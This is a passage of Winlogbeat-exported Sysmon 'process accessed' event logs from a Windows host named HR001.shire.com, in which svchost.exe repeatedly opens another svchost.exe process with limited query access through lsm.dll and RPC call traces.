20:43:00.003","SourceProcessId":"832","TargetProcessGUID":"{03ba39f5-ea6b-5ccb-0000-0010732c0200}","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+ea4e|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","TargetImage":"C:\\Windows\\System32\\svchost.exe","GrantedAccess":"0x1000","SourceProcessGUID":"{03ba39f5-ea63-5ccb-0000-0010edea0000}","SourceImage":"C:\\Windows\\system32\\svchost.exe"},"message":"Process accessed:\nRuleName: \nUtcTime: 2019-05-18 20:43:00.003\nSourceProcessGUID: {03ba39f5-ea63-5ccb-0000-0010edea0000}\nSourceProcessId: 832\nSourceThreadId: 6996\nSourceImage: C:\\Windows\\system32\\svchost.exe\nTargetProcessGUID: {03ba39f5-ea6b-5ccb-0000-0010732c0200}\nTargetProcessId: 2388\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1000\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+ea4e|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","event_id":10,"opcode":"Info","type":"wineventlog","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","computer_name":"HR001.shire.com","process_id":2440,"host":{"name":"WECserver"},"version":3,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"record_number":"2237779","source_name":"Microsoft-Windows-Sysmon","user":{"domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18","name":"SYSTEM"},"log_name":"Microsoft-Windows-Sysmon/Operational","task":"Process accessed (rule: ProcessAccess)","thread_id":3144,"level":"Information"}
{"@timestamp":"2019-05-18T20:43:00.007Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"version":3,"thread_id":3144,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","computer_name":"HR001.shire.com","event_data":{"SourceImage":"C:\\Windows\\system32\\svchost.exe","TargetImage":"C:\\Windows\\System32\\svchost.exe","GrantedAccess":"0x1000","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+d909|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","UtcTime":"2019-05-18 20:43:00.003","SourceProcessGUID":"{03ba39f5-ea63-5ccb-0000-0010edea0000}","SourceProcessId":"832","SourceThreadId":"6996","TargetProcessId":"2388","TargetProcessGUID":"{03ba39f5-ea6b-5ccb-0000-0010732c0200}"},"task":"Process accessed (rule: ProcessAccess)","beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"},"source_name":"Microsoft-Windows-Sysmon","record_number":"2237780","host":{"name":"WECserver"},"level":"Information","type":"wineventlog","log_name":"Microsoft-Windows-Sysmon/Operational","process_id":2440,"user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"event_id":10,"opcode":"Info","message":"Process accessed:\nRuleName: \nUtcTime: 2019-05-18 20:43:00.003\nSourceProcessGUID: {03ba39f5-ea63-5ccb-0000-0010edea0000}\nSourceProcessId: 832\nSourceThreadId: 6996\nSourceImage: C:\\Windows\\system32\\svchost.exe\nTargetProcessGUID: {03ba39f5-ea6b-5ccb-0000-0010732c0200}\nTargetProcessId: 2388\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1000\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+d909|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271"}
{"@timestamp":"2019-05-18T20:43:00.007Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"process_id":2440,"level":"Information","opcode":"Info","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_data":{"SourceProcessGUID":"{03ba39f5-ea63-5ccb-0000-0010edea0000}","SourceImage":"C:\\Windows\\system32\\svchost.exe","TargetProcessId":"2388","GrantedAccess":"0x1000","TargetProcessGUID":"{03ba39f5-ea6b-5ccb-0000-0010732c0200}","UtcTime":"2019-05-18 20:43:00.003","SourceProcessId":"832","TargetImage":"C:\\Windows\\System32\\svchost.exe","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+daf1|c:\\windows\\system32\\lsm.dll+d9eb|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","SourceThreadId":"6996"},"event_id":10,"task":"Process accessed (rule: ProcessAccess)","version":3,"thread_id":3144,"host":{"name":"WECserver"},"message":"Process accessed:\nRuleName: \nUtcTime: 2019-05-18 20:43:00.003\nSourceProcessGUID: {03ba39f5-ea63-5ccb-0000-0010edea0000}\nSourceProcessId: 832\nSourceThreadId: 6996\nSourceImage: C:\\Windows\\system32\\svchost.exe\nTargetProcessGUID: {03ba39f5-ea6b-5ccb-0000-0010732c0200}\nTargetProcessId: 2388\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1000\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+f2e7|c:\\windows\\system32\\lsm.dll+daf1|c:\\windows\\system32\\lsm.dll+d9eb|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"},"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"source_name":"Microsoft-Windows-Sysmon","computer_name":"HR001.shire.com","record_number":"2237781","type":"wineventlog","log_name":"Microsoft-Windows-Sysmon/Operational"}
